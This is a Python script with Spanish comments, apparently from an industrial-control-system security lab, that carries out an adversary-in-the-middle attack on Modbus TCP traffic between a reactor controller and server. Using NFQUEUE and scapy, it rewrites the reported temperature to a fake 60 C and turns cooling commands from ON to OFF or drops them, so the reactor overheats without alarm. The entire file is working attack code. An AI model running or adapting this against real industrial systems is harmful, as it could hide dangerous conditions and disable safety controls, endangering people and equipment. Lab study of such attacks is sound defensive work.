#!/usr/bin/env python3
"""
Manipulacion del trafico Modbus  --  parte 2 del T0830 (Adversary-in-the-Middle).

Una vez el ARP spoofing desvia el trafico por esta maquina, Linux lo reenvia y
una regla iptables lo entrega a una cola NFQUEUE. Este script lee cada paquete,
interpreta la trama Modbus TCP y aplica el ataque sobre el enlace
CONTROLADOR <-> SERVIDOR del reactor:

  - modo 'sensor' : reescribe la temperatura medida (HR0) en las RESPUESTAS del
                    servidor hacia el controlador -> el controlador ve 60 C
                    aunque el reactor este a 90 C (no refrigera, no da alarma).
                    [MITRE T0856 Spoof Reporting / T0832 Manipulation of View]
  - modo 'control': intercepta las ORDENES de refrigeracion (Write Coil) del
                    controlador hacia el servidor -> la refrigeracion nunca actua.
                    Por defecto las "neutraliza" (ON->OFF) para no romper la
                    conexion TCP; con --block las descarta (drop).
                    [MITRE T0831 Manipulation of Control]
  - modo 'both'   : las dos a la vez (el reactor se dispara en silencio).

Mapa de la Parte A:
    HR0 = temperatura medida (C x 10)   -> el primer registro de la respuesta 0x03
    Coil0 = orden de refrigeracion       -> Write Single Coil (0x05), ON = 0xFF00

Trama Modbus TCP (MBAP + PDU):
    [TID 2][PID 2][LEN 2][UNIT 1][FC 1][datos...]

Uso (en la VM atacante, tras lanzar arp_spoof.py y setup_atacante.sh start):
    sudo python3 mitm_modbus.py --server-ip <IP_SERVIDOR> --mode both
"""
import argparse
import struct

from netfilterqueue import NetfilterQueue
from scapy.all import IP, Raw, TCP

FC_READ_HOLDING = 0x03      # respuesta de lectura (servidor -> controlador)
FC_WRITE_COIL = 0x05        # orden de escritura de coil (controlador -> servidor)
COIL_ON = 0xFF00
COIL_OFF = 0x0000

# Rellenado desde argumentos en main().
SERVER_IP = None
MODO = "both"
BLOCK = False
COIL_REFRIGERACION = 0
TEMP_FALSA_RAW = 600        # 60.0 C x 10

_DROP = object()            # centinela: "descartar paquete"


def manipular(load, src_ip, dst_ip):
    """Devuelve la nueva carga Modbus, la original, o _DROP."""
    if len(load) < 8:
        return load  # no es una trama Modbus completa
    fc = load[7]

    # ---- RESPUESTA del servidor: reescribir la temperatura medida (HR0) ----
    # PDU respuesta 0x03: [UNIT][FC][BYTECOUNT][reg0_hi][reg0_lo][reg1_hi]...
    # HR0 (medida) es el primer registro -> offset 9.
    if src_ip == SERVER_IP and fc == FC_READ_HOLDING and MODO in ("sensor", "both"):
        byte_count = load[8]
        if byte_count >= 2 and len(load) >= 11:
            nuevo = bytearray(load)
            struct.pack_into(">H", nuevo, 9, TEMP_FALSA_RAW)
            return bytes(nuevo)

    # ---- ORDEN de control: neutralizar o bloquear la refrigeracion ----
    # PDU peticion 0x05: [UNIT][FC][ADDR_hi][ADDR_lo][VAL_hi][VAL_lo]
    if dst_ip == SERVER_IP and fc == FC_WRITE_COIL and MODO in ("control", "both"):
        if len(load) >= 12:
            addr, valor = struct.unpack(">HH", load[8:12])
            if addr == COIL_REFRIGERACION and valor == COIL_ON:
                if BLOCK:
                    return _DROP                       # no reenviar la orden
                nuevo = bytearray(load)
                struct.pack_into(">H", nuevo, 10, COIL_OFF)   # ON -> OFF
                return bytes(nuevo)

    return load


def callback(nfq_pkt):
    pkt = IP(nfq_pkt.get_payload())
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        nfq_pkt.accept()
        return

    load = bytes(pkt[Raw].load)
    resultado = manipular(load, pkt[IP].src, pkt[IP].dst)

    if resultado is _DROP:
        print(f"[MITM] DROP orden de refrigeracion {pkt[IP].src} -> {pkt[IP].dst}", flush=True)
        nfq_pkt.drop()
        return

    if resultado != load:
        pkt[Raw].load = resultado
        # Borramos longitudes/checksums para que scapy los recalcule.
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum
        nfq_pkt.set_payload(bytes(pkt))
        print(f"[MITM] Trama modificada {pkt[IP].src} -> {pkt[IP].dst} (fc=0x{load[7]:02x})",
              flush=True)

    nfq_pkt.accept()


def main():
    global SERVER_IP, MODO, BLOCK, COIL_REFRIGERACION, TEMP_FALSA_RAW
    parser = argparse.ArgumentParser(description="MITM Modbus sobre NFQUEUE (T0830)")
    parser.add_argument("--server-ip", required=True, help="IP del servidor Modbus")
    parser.add_argument("--mode", choices=["sensor", "control", "both"], default="both")
    parser.add_argument("--block", action="store_true",
                        help="descartar (drop) las ordenes de control en vez de neutralizarlas")
    parser.add_argument("--coil", type=int, default=0, help="direccion del coil de refrigeracion")
    parser.add_argument("--fake-temp", type=float, default=60.0,
                        help="temperatura falsa en C que ve el controlador")
    parser.add_argument("--queue-num", type=int, default=1)
    args = parser.parse_args()

    SERVER_IP = args.server_ip
    MODO = args.mode
    BLOCK = args.block
    COIL_REFRIGERACION = args.coil
    TEMP_FALSA_RAW = int(round(args.fake_temp * 10))

    print(f"[MITM] Servidor={SERVER_IP}  modo={MODO}  "
          f"control={'DROP' if BLOCK else 'neutralizar ON->OFF'}  "
          f"temp_falsa={args.fake_temp} C")
    print("[MITM] Escuchando en NFQUEUE... (Ctrl+C para parar)")

    nfq = NetfilterQueue()
    nfq.bind(args.queue_num, callback)
    try:
        nfq.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfq.unbind()
        print("\n[MITM] Parado.")


if __name__ == "__main__":
    main()
